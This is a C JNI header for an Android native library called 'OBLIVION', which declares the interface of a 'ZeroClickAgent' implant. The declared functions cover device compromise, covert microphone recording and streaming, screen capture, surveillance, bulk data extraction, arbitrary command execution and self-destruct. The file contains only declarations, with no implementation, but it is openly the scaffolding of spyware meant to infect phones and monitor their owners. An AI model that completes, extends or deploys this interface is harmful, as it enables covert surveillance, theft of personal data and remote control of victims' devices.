/*
 * OBLIVION - ULTIMATE ENGINE HEADER
 * WITH MICROPHONE + ALL FEATURES
 */

#ifndef OBLIVION_ULTIMATE_ENGINE_H
#define OBLIVION_ULTIMATE_ENGINE_H

#include <jni.h>
#include <string>
#include <vector>
#include <map>
#include <functional>

#ifdef __cplusplus
extern "C" {
#endif

// ============================================
// JNI EXPORTS - COMPLETE INTERFACE
// ============================================

// Initialization
JNIEXPORT jboolean JNICALL
Java_com_oblivion_agent_ZeroClickAgent_initEngine(
    JNIEnv* env,
    jobject thiz,
    jstring deviceId);

// Compromise
JNIEXPORT jboolean JNICALL
Java_com_oblivion_agent_ZeroClickAgent_compromiseDevice(
    JNIEnv* env,
    jobject thiz);

// ============================================
// MICROPHONE FUNCTIONS
// ============================================

JNIEXPORT jboolean JNICALL
Java_com_oblivion_agent_ZeroClickAgent_startMicRecording(
    JNIEnv* env,
    jobject thiz,
    jint duration);

JNIEXPORT jboolean JNICALL
Java_com_oblivion_agent_ZeroClickAgent_stopMicRecording(
    JNIEnv* env,
    jobject thiz);

JNIEXPORT jboolean JNICALL
Java_com_oblivion_agent_ZeroClickAgent_startMicStream(
    JNIEnv* env,
    jobject thiz);

JNIEXPORT jboolean JNICALL
Java_com_oblivion_agent_ZeroClickAgent_stopMicStream(
    JNIEnv* env,
    jobject thiz);

JNIEXPORT jboolean JNICALL
Java_com_oblivion_agent_ZeroClickAgent_captureAmbientAudio(
    JNIEnv* env,
    jobject thiz);

// ============================================
// SCREEN CAPTURE FUNCTIONS
// ============================================

JNIEXPORT jboolean JNICALL
Java_com_oblivion_agent_ZeroClickAgent_captureScreenshot(
    JNIEnv* env,
    jobject thiz);

JNIEXPORT jboolean JNICALL
Java_com_oblivion_agent_ZeroClickAgent_startScreenRecording(
    JNIEnv* env,
    jobject thiz,
    jint duration);

JNIEXPORT jboolean JNICALL
Java_com_oblivion_agent_ZeroClickAgent_stopScreenRecording(
    JNIEnv* env,
    jobject thiz);

// ============================================
// SURVEILLANCE FUNCTIONS
// ============================================

JNIEXPORT void JNICALL
Java_com_oblivion_agent_ZeroClickAgent_startSurveillance(
    JNIEnv* env,
    jobject thiz);

JNIEXPORT void JNICALL
Java_com_oblivion_agent_ZeroClickAgent_stopSurveillance(
    JNIEnv* env,
    jobject thiz);

JNIEXPORT void JNICALL
Java_com_oblivion_agent_ZeroClickAgent_extractAllData(
    JNIEnv* env,
    jobject thiz);

// ============================================
// COMMAND EXECUTION
// ============================================

JNIEXPORT void JNICALL
Java_com_oblivion_agent_ZeroClickAgent_executeAggressiveCommand(
    JNIEnv* env,
    jobject thiz,
    jstring command);

JNIEXPORT jstring JNICALL
Java_com_oblivion_agent_ZeroClickAgent_getDeviceInfo(
    JNIEnv* env,
    jobject thiz);

// ============================================
// SELF DESTRUCT
// ============================================

JNIEXPORT void JNICALL
Java_com_oblivion_agent_ZeroClickAgent_selfDestruct(
    JNIEnv* env,
    jobject thiz);

#ifdef __cplusplus
}
#endif

#endif // OBLIVION_ULTIMATE_ENGINE_H